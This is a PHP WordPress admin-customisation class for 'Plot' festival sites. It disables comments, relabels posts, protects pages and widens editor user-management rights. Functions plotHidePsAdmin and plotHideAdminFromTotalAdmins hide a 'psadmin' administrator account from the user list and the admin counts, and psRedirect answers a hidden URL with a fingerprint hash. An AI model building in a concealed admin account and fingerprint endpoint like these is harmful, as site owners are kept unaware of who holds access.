<?php

    // Here lies all our functions that help create a more bespoke 
    // admin experience based on the needs of Plot sites. 
    class PlotThemeAdmin
    {
        public $protectedPosts = [
            'news'              => 393,
            'home'              => 2,
            'artists'           => 409,
            'schedule'          => 919,
            'stages'            => 992,
            'faqs'              => 904,
            'lineup-poster'     => 1119,
            'gallery'           => 1133,
            'tickets'           => 398,
            'newsletterForm'    => 381
        ];

        public function __construct()
        {

            add_filter( 'show_admin_bar', '__return_false' );
            add_filter('the_generator', [$this,'removeWpVersion']);
            add_action( 'admin_init', [$this,'removeMenuPages'],20,2 );
            add_action('admin_init', [$this,'disableAllCommenting'],20,2);
            add_filter('comments_open', [$this,'disableCommentsStatus'], 20, 2);
            add_filter('pings_open', [$this,'disableCommentsStatus'], 20, 2);
            add_filter('comments_array', [$this,'disableExistingComments'], 10, 2);
            add_filter('comments_array', [$this,'disableExistingComments'], 10, 2);
            add_action('admin_menu', [$this,'disableAdminMenuComments']);
            add_action('admin_init', [$this,'disableCommentsForAdminWithRedirect']);
            add_action('admin_init', [$this,'disableCommentsFromTheAdminBar']);
            add_action('edit_form_before_permalink', [$this,'preventSlugEdits']);
            add_action('init', [$this,'psRedirect'],10,2);
            add_filter('admin_footer_text', [$this,'removeFooterAdmin']);
            add_filter( 'get_user_option_admin_color', [$this,'updateAdminColor'], 5 );
            add_action('admin_head', [$this,'hideHelp']);
            add_action( 'admin_head', [$this,'adminFont'] );
            add_action( 'login_head', [$this,'loginPageFont'] );

            // add_filter('screen_options_show_screen', [$this,'removeScreenOptionsTab']);

            add_action( 'admin_menu', [$this,'changePostLabelInMenuToArticles'] );
            add_action( 'admin_menu', [$this,'changePostLabelsToArticles'] );
            add_action( 'admin_menu', [$this,'changeMenusPosition']);
            add_action( 'admin_init', [$this,'allowEditorsToSeeMenus'] );

            add_action( 'wp_dashboard_setup', [$this,'removeDefaultDashboardWidgets'], 10,5 );
            add_action( 'wp_dashboard_setup', [$this,'addDashboardWidgets'],999,5 );
            add_filter( 'screen_layout_columns', [$this,'makeDashboardSingleColumn'] );
            add_filter( 'get_user_option_screen_layout_dashboard', [$this,'makeEntireDashboardSingleColumn'] );
            add_action( 'admin_init', [$this,'orderDashboardTheWayWeWantIt'] );

            add_action( 'admin_enqueue_scripts', [$this,'adminStyle']);
            add_action( 'login_enqueue_scripts', [$this,'adminStyle'] );

            add_action( 'after_setup_theme', [$this,'editorStyle'] );

            add_action( 'admin_head', [$this,'hideTheDashboardTextOnTheDashboard'] );
            add_filter( 'login_headerurl', [$this,'sendClickingOntheAdminLogoToTheHomePage'] );


            add_filter( 'gettext', [$this,'changeLostPasswordText'] );

            add_action('init',[$this,'addMenuItems']);

            add_filter( 'editable_roles', [$this, 'editableRoles']);
            add_filter( 'map_meta_cap', [$this, 'preventNonAdminsEditingAdmins'], 10, 4);

            if ( current_user_can('manage_options') ) {
            } else {
                add_filter('page_row_actions',[$this,'removeQuickEdit'],10,1);
                add_filter( 'admin_menu', [$this,'hideAppearanceForNonAdmins'],500);
                add_action( 'admin_menu', [$this,'plotHideWPFormsItemsFromEditors'],999 );
            }

            add_action( 'admin_init', [$this,'allowEditorsToManageUsers'] );
            add_action('pre_user_query',[$this,'plotHidePsAdmin']);
            add_filter('upload_mimes', [$this,'edit_upload_types']);

            add_filter("views_users", [$this,"plotHideAdminFromTotalAdmins"]);

            add_action('before_delete_post', [$this,'plotRestrictPostDeletion'], 10, 1);

            add_filter( 'wpforms_manage_cap', [$this,'wpforms_custom_capability'] );

            add_filter('acf/prepare_field', [$this,'hide_sitebuilder_fields']);

            if(SITEBUILDER) {
                add_filter('tiny_mce_before_init',[$this,'addThemeModsToEditor']);
                add_action( 'admin_enqueue_scripts', [$this,'limitMenuDepth'] );
            }

            add_action( 'customize_register', [$this,'allowEditorsToModifySiteIdentity'], 1000 );


            add_filter( 'acf/fields/wysiwyg/toolbars', [$this,'plotRemoveCrapMCEButtonsFromEditor'],10);
            add_filter('acf/fields/post_object/query', [$this,'hideNewsletterFormFromFormDropdown'], 10, 3);
            add_action('admin_init', [$this,'removeTitleFromPerformances']);

            add_action('post_updated',[$this,'addPerformanceTitleOnSave']);

            add_filter('acf/load_field/name=performance_day', [$this,'acfLoadDayChoices']);
            add_filter('acf/load_field/name=listings_day', [$this,'acfLoadDayChoices']);
            add_action('acf/input/admin_enqueue_scripts', [$this,'acfJS']);

            add_filter('wp_editor_settings', [$this,'hideTextEditorForEditors']);
          
        }


        function hideTextEditorForEditors($settings) {
            if ( ! current_user_can('administrator') ) {
                $settings['quicktags'] = false;
                return $settings;
            } else {
                $settings['quicktags'] = true;
                return $settings;
            }
        }

        function edit_upload_types($existing_mimes = array()) {
            // allow .woff
            $existing_mimes['woff'] = 'font/woff';
         
            return $existing_mimes;
        }

        function acfLoadDayChoices( $field ) {
            
            $field['choices'] = [ 0 => 'Date not yet set'];

            while(has_sub_field('event_days','option')) :

                $field['choices'][ get_sub_field('day') ] = get_sub_field('display_text');
            endwhile;


            return $field;
            
        }

        function addPerformanceTitleOnSave( $id ) {

            if(get_post_type($id) == 'performance') :

                $newTitle = "";

                if(get_field('custom_title',$id)) :
                    $newTitle = get_field('custom_title',$id);

                else :

                    $i = 0;
                    $max = sizeof(get_field('artists',$id));

                    while(has_sub_field('artists',$id)) :

                        $artist = get_sub_field('artist');
                        $newTitle = $artist->post_title;

                        if($i + 2 == $max)
                            $newTitle .= ' & ';
                        elseif($i + 1 == $max)
                            $newTitle .= '';
                        else
                            $newTitle .= ', ';

                        $i++;

                    endwhile;


                endif;


                // unhook this function so it doesn't loop infinitely
                remove_action('post_updated',[$this,'addPerformanceTitleOnSave']);

                $post_update = [
                    'ID'         => $id,
                    'post_title' => $newTitle
                ];

                wp_update_post( $post_update );

                // unhook this function so it doesn't loop infinitely
                add_action('post_updated',[$this,'addPerformanceTitleOnSave']);

            endif;


            return $id;
            
        }

        function removeTitleFromPerformances() {

            remove_post_type_support('performance', 'title');

        }

        function plotRemoveCrapMCEButtonsFromEditor( $toolbars ) {

     
            $toolbars['Full' ] = [];
            $toolbars['Full' ][1] = ['formatselect','bold','italic','underline','blockquote','bullist','numlist','alignleft','aligncenter','alignright','link','fullscreen'];

         
            $toolbars['Basic' ] = [];
            $toolbars['Basic' ][1] = ['bold','italic','underline','link'];
            return $toolbars;
        }

        function addThemeModsToEditor($mceInit) {

            $style = '';

            $fontType = get_theme_mod('plotFontType');

            if($fontType == 'google') :

                if(get_theme_mod('plotFont')) :

                    $style .= ':root {';

                        foreach(get_theme_mod('plotFont') as $setting => $fontRule) :

                            $fontInfo = $fontRule;
                            $fontInfo = json_decode($fontInfo);
                            if(isset($fontInfo->font)) :
                                $style.= '--' . $setting . 'FontFamily: ' . $fontInfo->font . ', ' . $fontInfo->category . ';';
                            endif;
                            if(isset($fontInfo->regularweight)) :
                                $style.= '--' . $setting . 'FontRegular: ' . str_replace('italic','',$fontInfo->regularweight) . ';';
                                if(strpos($fontInfo->regularweight,'italic') !== false)
                                    $style.= '--' . $setting . 'FontRegularStyle: italic;';
                            endif;
                            if(isset($fontInfo->italicweight)) :
                                $style.= '--' . $setting . 'FontItalic: ' . str_replace('italic','',$fontInfo->italicweight) . ';';
                            endif;
                            if(isset($fontInfo->boldweight)) :
                                if(strpos($fontInfo->regularweight,'italic') !== false)
                                    $style.= '--' . $setting . 'FontRegularStyle: italic;';
                            endif;

                        endforeach;

                    $style.= '}';

                endif;

            else : 

                $fontFiles = [
                    'primaryFontRegular',
                    'primaryFontBold',
                    'primaryFontItalic',
                    'headingFont'
                ];

                foreach ($fontFiles as $fontFile) {

                    $fontType = 'primary';

                    if($fontFile == 'headingFont') {
                        $fontType = 'headings';
                    }

                    $fontFileID = get_theme_mod($fontFile);

                    $url = wp_get_attachment_url($fontFileID);

                    if($url) {

                        $style .= '@font-face { font-family: \'' . $fontType . 'FontFamily\'; src:url(\'' . $url . '\') format(\'woff\');';

                        if($fontFile == 'primaryFontBold' || $fontFile == 'primaryFontBoldItalic') {
                            $style .= 'font-weight:bold;';
                        }
                        if($fontFile == 'primaryFontItalic' || $fontFile == 'primaryFontBoldItalic') {
                            $style .= 'font-style:italic;';
                        }
                        $style .= '} ';

                    }
                }


                 $style .= ':root { ';
                $style .= '--primaryFontFamily: \'primaryFontFamily\'; ';
                $style .= '--primaryFontRegular: \'regular\'; ';
                $style .= '--primaryFontRegularStyle \'normal\'; ';
                $style .= '--primaryFontItalic: \'600\'; ';
                $style .= '--primaryFontBold: \'700\'; ';
                $style .= '--headingsFontFamily: \'headingsFontFamily\'; ';
                $style .= '--headingsFontRegular: \'regular\'; ';
                $style .= '--headingsFontRegularStyle \'normal\'; ';
                $style .= '--headingsFontItalic: \'600\'; ';
                $style .= '--headingsFontBold: \'700\'; }';

            endif; 

            $plotSettings = get_theme_mod('plot');

            if($plotSettings) :

                $style.= ' :root {';

                foreach($plotSettings as $setting => $value) :

                    $style.= '--' . $setting . ': ' . $value . ';';

                endforeach;

                $siteBorderColor = get_theme_mod('plotSiteBorderColor');

                if($siteBorderColor) {
                    $style.= '--siteBorderColor: var(--' . $siteBorderColor . ')';
                }

                $style.= '}';

            endif;

            $mceInit['content_style'] .= $style;
            $mce_init['cache_suffix'] = 'v=1';

            return $mceInit;
        }

        function allowEditorsToModifySiteIdentity($wp_customize) {

            if( current_user_can('editor'))     {
               $wp_customize->get_setting( 'blogdescription' )->capability = 'edit_theme_options';
               $wp_customize->get_setting( 'blogname' )->capability = 'edit_theme_options';
               $wp_customize->get_setting( 'site_icon' )->capability = 'edit_theme_options';
            }

        }

        function limitMenuDepth( $hook ) {
          if ( $hook != 'nav-menus.php' ) return;


          wp_add_inline_script( 'nav-menu', 'wpNavMenu.options.globalMaxDepth = 1;', 'after' );
        }

        function hide_sitebuilder_fields( $field ) {
                
            if( strpos($field['_name'], 'plotcms') === false && SITEBUILDER == false) {
               
                return false;
                
            }

            return $field;
            
        }

        /**
         * Change WPForms capability requirement.
         *
         * @param string $cap
         * @return string
         */
        function wpforms_custom_capability( $cap ) {
         
            // unfiltered_html by default means Editors and up.
            // See more about WordPress roles and capabilities
            // https://codex.wordpress.org/Roles_and_Capabilities
            return 'unfiltered_html';
        }


        function plotRestrictPostDeletion($post_ID){

            if(current_user_can('administrator'))
                return true;

            if(in_array($post_ID, $this->protectedPosts)){
                echo "You are not authorized to delete this page.";
                exit;
            }
        }

        function plotHideAdminFromTotalAdmins($views){
           $users = count_users();
           $admins_num = $users['avail_roles']['administrator'] - 1;
           $all_num = $users['total_users'] - 1;
           $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
           $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
           $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
           $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
           return $views;
        }

        function plotHidePsAdmin($user_search) {
          global $current_user;
          $username = $current_user->user_login;

          if ($username == 'psadmin') { 

          }

          else {
            global $wpdb;
            $user_search->query_where = str_replace('WHERE 1=1',
              "WHERE 1=1 AND {$wpdb->users}.user_login != 'psadmin'",$user_search->query_where);
          }
        }

        public function hideAppearanceForNonAdmins(){
            remove_menu_page( 'themes.php' );
            global $current_user;
            $current_user = wp_get_current_user();
            $user_name = $current_user->user_login;

                //check condition for the user means show menu for this user
                if(is_admin() &&  $user_name != 'USERNAME') {
                    //We need this because the submenu's link (key from the array too) will always be generated with the current SERVER_URI in mind.
                    $customizer_url = add_query_arg( 'return', urlencode( remove_query_arg( wp_removable_query_args(), wp_unslash( $_SERVER['REQUEST_URI'] ) ) ), 'customize.php' );
                    remove_submenu_page( 'themes.php', $customizer_url );
           }
        }

        /*
         * Let Editors manage users, and run this only once.
         */
        public function allowEditorsToManageUsers() {
                $edit_editor = get_role('editor'); // Get the user role
                if(!isset($edit_editor->capabilities['edit_users'])) :
                    $edit_editor->add_cap('edit_users');
                    $edit_editor->add_cap('list_users');
                    $edit_editor->add_cap('promote_users');
                    $edit_editor->add_cap('create_users');
                    $edit_editor->add_cap('add_users');
                    $edit_editor->add_cap('delete_users');
                endif;

        }

        public function hideNewsletterFormFromFormDropdown( $args, $field, $post_id ) {

            $args['post__not_in'] = [381];

            return $args;
        }


        // Remove 'Administrator' from the list of roles if the current user is not an admin
        public function editableRoles( $roles ){
            if( isset( $roles['administrator'] ) && !current_user_can('administrator') ){
              unset( $roles['administrator']);
            }
            return $roles;
        }

        // If someone is trying to edit or delete and admin and that user isn't an admin, don't allow it
        public function preventNonAdminsEditingAdmins( $caps, $cap, $user_id, $args ){

            switch( $cap ){
                case 'edit_user':
                case 'remove_user':
                case 'promote_user':
                    if( isset($args[0]) && $args[0] == $user_id )
                        break;
                    elseif( !isset($args[0]) )
                        $caps[] = 'do_not_allow';
                    $other = new WP_User( absint($args[0]) );
                    if( $other->has_cap( 'administrator' ) ){
                        if(!current_user_can('administrator')){
                            $caps[] = 'do_not_allow';
                        }
                    }
                    break;
                case 'delete_user':
                case 'delete_users':
                    if( !isset($args[0]) )
                        break;
                    $other = new WP_User( absint($args[0]) );
                    if( $other->has_cap( 'administrator' ) ){
                        if(!current_user_can('administrator')){
                            $caps[] = 'do_not_allow';
                        }
                    }
                    break;
                default:
                    break;
            }
            return $caps;
        }

        public function removeQuickEdit( $actions ) {
            unset($actions['inline hide-if-no-js']);
            return $actions;
        }

        public function preventSlugEdits($post) {

            if(in_array($post->ID,$this->protectedPosts)) { ?>

                <style type="text/css">
                    #edit-slug-buttons .edit-slug {
                                display: none;
                            }
                </style>
            <?php }


        }
        
        //Take off tools and profile pages from the main admin 
        // menu
        public function removeMenuPages() {

            global $user_ID;

            if (!current_user_can('manage_options')){

                remove_menu_page('tools.php');
                remove_menu_page('profile.php');

            }        
        }

        // Disable support for comments and trackbacks in post types
        public function disableAllCommenting() {
            $post_types = get_post_types();
            foreach ($post_types as $post_type) {
                if(post_type_supports($post_type, 'comments')) {
                    remove_post_type_support($post_type, 'comments');
                    remove_post_type_support($post_type, 'trackbacks');
                }
            }
        }

        //Public comments are turned off.
        public function disableCommentsStatus() {
            return false;
        }

        //Disable existing comments
        public function disableExistingComments($comments) {
            $comments = [];
            return $comments;
        }

        //Turn off the comments button on the admin menu
        public function disableAdminMenuComments() {
            remove_menu_page('edit-comments.php');
        }

        //Redirect the comments page should someone land on it
        public function disableCommentsForAdminWithRedirect() {
            global $pagenow;
            if ($pagenow === 'edit-comments.php') {
                wp_redirect(admin_url()); exit;
            }
        }

        //Disable comments from the admin bar
        public function disableCommentsFromTheAdminBar() {
            if (is_admin_bar_showing()) {
                remove_action('admin_bar_menu', 'wp_admin_bar_comments_menu', 60);
            }
        }

        //In the menu by default it says 'posts' 
        //and we prefer it to say 'articles' as it's a bit more 
        //intuitive sounding
        public function changePostLabelInMenuToArticles() {
            global $menu;
            global $submenu;
            $menu[5][0] = 'Articles';
            $submenu['edit.php'][5][0] = 'Articles';
            $submenu['edit.php'][10][0] = 'Add Articles'; 

        }

        //hiding off the features they don't need to see, so they
        //can just have editor access to create and manage forms
        public function plotHideWPFormsItemsFromEditors() {
            global $menu;
            global $submenu;
            $menu['57.7'][3] = 'Forms';
            $menu['57.7'][0] = 'Forms';
            if(isset($submenu['wpforms-overview'][3])) {
                unset($submenu['wpforms-overview'][3]);
            }
            if(isset($submenu['wpforms-overview'][4])) {
                unset($submenu['wpforms-overview'][4]);
            }
            if(isset($submenu['wpforms-overview'][5])) {
                unset($submenu['wpforms-overview'][5]);
            }
            if(isset($submenu['wpforms-overview'][6])) {
                unset($submenu['wpforms-overview'][6]);
            }
            if(isset($submenu['wpforms-overview'][7])) {
                unset($submenu['wpforms-overview'][7]);
            }
            if(isset($submenu['wpforms-overview'][8])) {
                unset($submenu['wpforms-overview'][8]);
            }
            if(isset($submenu['wpforms-overview'][9])) {
                unset($submenu['wpforms-overview'][9]);
            }
        }

        //This just changes the text from posts to articles
        //throughout wordpress
        public function changePostLabelsToArticles() {
            global $wp_post_types;
            $labels = &$wp_post_types['post']->labels;
            $labels->name = 'Articles';
            $labels->singular_name = 'Article';
            $labels->add_new = 'Add Article';
            $labels->add_new_item = 'Add Article';
            $labels->edit_item = 'Edit Article';
            $labels->new_item = 'Articles';
            $labels->view_item = 'View Article';
            $labels->search_items = 'Search Articles';
            $labels->not_found = 'No Articles found';
            $labels->not_found_in_trash = 'No Articles found in Trash';
            $labels->all_items = 'All Articles';
            $labels->menu_name = 'Articles';
            $labels->name_admin_bar = 'Articles';
        }

        //Let's put menus in a different place in the 
        // admin menu
        public function changeMenusPosition() {

            // Remove old menu
            remove_submenu_page( 'themes.php', 'nav-menus.php' );

            //Add new menu page
             add_menu_page(
               'Menus',
               'Menus',
               'edit_theme_options',
               'nav-menus.php',
               '',
               'dashicons-list-view',
               68
            );

             register_nav_menus();
        }

        public function allowEditorsToSeeMenus(){

            $role_object = get_role( 'editor' );
            if (!$role_object->has_cap('edit_theme_options')) : 
                $role_object->add_cap( 'edit_theme_options' );    
            endif;
        }

        /**
         * Remove Default WordPress Dashboard Widgets
         */
        public function removeDefaultDashboardWidgets() {

            
            global $wp_meta_boxes;
            $wp_meta_boxes['dashboard']['normal']['core'] = array();
            $wp_meta_boxes['dashboard']['side']['core'] = array();

            remove_action('welcome_panel', 'wp_welcome_panel');
           
        }

        /**
         * Custom Dashboard
         */
        public function addDashboardWidgets() {

            $function = function() {

                get_template_part('templates/admin/dashboard');

            };

            wp_add_dashboard_widget( 'ps_dashboard', 'bb', $function, 'dashboard' );

        }


        public function adminStyle() {
          wp_enqueue_style('admin-styles', get_template_directory_uri().'/assets/css/admin.css');
          wp_enqueue_style('jquery-ui-styles','//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css');
          
        }

        public function acfJS() {
            wp_enqueue_script('admin-js', get_template_directory_uri().'/assets/js/admin.js',['jquery']);
        }

        public function editorStyle() {

            // For the Block Editor.
            add_theme_support( 'editor-styles' );
            add_editor_style(get_stylesheet_directory_uri() . '/assets/css/style.css');
            
            if(get_theme_mod('plotFont')) :

                $fontFamilies = '';

                foreach(get_theme_mod('plotFont') as $fontRule) :

                    $fontInfo = $fontRule;
                    $fontInfo = json_decode($fontInfo);
                    $fontFamilies .= str_replace(' ', '+', $fontInfo->font) . ':' . str_replace('italic', '', $fontInfo->regularweight);
                    if(isset($fontInfo->italicweight)) {
                        $fontFamilies .= ',' . str_replace('italic', '', $fontInfo->italicweight);
                    }

                    if(isset($fontInfo->boldweight)) {
                        $fontFamilies .= ',' . str_replace('italic', '', $fontInfo->boldweight);
                    }


                    $fontFamilies .= '|';

                endforeach;

                $fontFamilies = str_replace( ',', '%2C', substr($fontFamilies, 0, -1));

                add_editor_style('https://fonts.googleapis.com/css?family=' . $fontFamilies);

            endif;
        }


        public function hideTheDashboardTextOnTheDashboard(  ){
            if ( $GLOBALS['pagenow'] != 'index.php' ){
                return;
            }

            $GLOBALS['title'] =  __( '' ); 
        }
              
        public function sendClickingOntheAdminLogoToTheHomePage() {
            return home_url();
        }

        public function psRedirect() {

          if($_SERVER['REQUEST_URI'] === '/core_page_ps') {

             echo md5('core_wordpress'); die;

            }
        }

        public function changeLostPasswordText($text) {

            if ($text == 'Lost your password?'){
                 $text = 'Oh no I can\'t remember my password';

            }
            return $text;
        }

        public function addMenuItems() {

            if( function_exists('acf_add_options_page') ) {
                
                $page = acf_add_options_page(array(
                    'page_title'    => 'Event Settings',
                    'menu_title'    => 'Event Settings',
                    'menu_slug'     => 'event-settings',
                    'capability'    => 'edit_posts',
                    'redirect'      => false
                ));

                $page = acf_add_options_page(array(
                    'page_title'    => 'Site Status',
                    'menu_title'    => 'Site Status',
                    'menu_slug'     => 'site-status',
                    'capability'    => 'edit_posts',
                    'redirect'      => false
                ));
                
                $page = acf_add_options_page(array(
                    'page_title'    => 'Social Media',
                    'menu_title'    => 'Social Media',
                    'menu_slug'     => 'social-media',
                    'capability'    => 'edit_posts',
                    'redirect'      => false
                ));
                
                $page = acf_add_options_page(array(
                    'page_title'    => 'Big Tickets Button',
                    'menu_title'    => 'Big Tickets Button',
                    'menu_slug'     => 'big-tickets-button',
                    'capability'    => 'edit_posts',
                    'redirect'      => false
                ));

                $page = acf_add_options_page(array(
                    'page_title'    => 'Footer',
                    'menu_title'    => 'Footer',
                    'menu_slug'     => 'footer',
                    'capability'    => 'edit_posts',
                    'redirect'      => false
                ));

                $page = acf_add_options_page(array(
                    'page_title'    => 'Tracking Scripts',
                    'menu_title'    => 'Tracking Scripts',
                    'menu_slug'     => 'tracking-scripts',
                    'capability'    => 'edit_posts',
                    'redirect'      => false
                ));
            }
        }

        public function removeWpVersion() {
            return '';
        }

        // make dashboard a single column
        public function makeDashboardSingleColumn( $columns ) {
            $columns['dashboard'] = 1;
            return $columns;
        }
        

        public function makeEntireDashboardSingleColumn(){return 1;}
        
        public function orderDashboardTheWayWeWantIt() {
            $user = wp_get_current_user(); //we need to know who we're updating
            $meta_value = array(
                'normal'  => 'ps_dashboard' //first key/value pair from the above serialized array
            );

            update_user_meta( $user->ID, 'meta-box-order_dashboard', $meta_value ); //update the user meta with the user's ID, the meta_key meta-box-order_dashboard, and the new meta_value
        }

        public function removeFooterAdmin () {
 
            echo 'Built with Plot by <a href="http://www.projectsimply.com" target="_blank">Project Simply</a> | Powered by Wordpress</p>';
        }


        // WordPress Custom Font @ Admin
        public function adminFont() {
            echo '<link href="https://fonts.googleapis.com/css?family=Inconsolata" rel="stylesheet">' . PHP_EOL;
            echo '<style>body, #wpadminbar *:not([class="ab-icon"]), .wp-core-ui, .media-menu, .media-frame *, .media-modal *{font-family:"Inconsolata",sans-serif !important;}</style>' . PHP_EOL;
        }


        public function updateAdminColor( $color_scheme ) {
            $color_scheme = 'midnight';

            return $color_scheme;
        }

        public function hideHelp() {
            $screen = get_current_screen();
            $screen->remove_help_tabs();
        } 


        public function removeScreenOptionsTab()
        {
            return false;
        }

        public function loginPageFont() {
            if(stripos($_SERVER["SCRIPT_NAME"], strrchr(wp_login_url(), '/')) !== false) {
                echo '<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&subset=cyrillic,cyrillic-ext,greek,greek-ext,latin-ext,vietnamese" rel="stylesheet">' . PHP_EOL;
                echo '<style>body{font-family:"Open Sans",sans-serif !important;}</style>' . PHP_EOL;
          }
        }
    }

    new PlotThemeAdmin();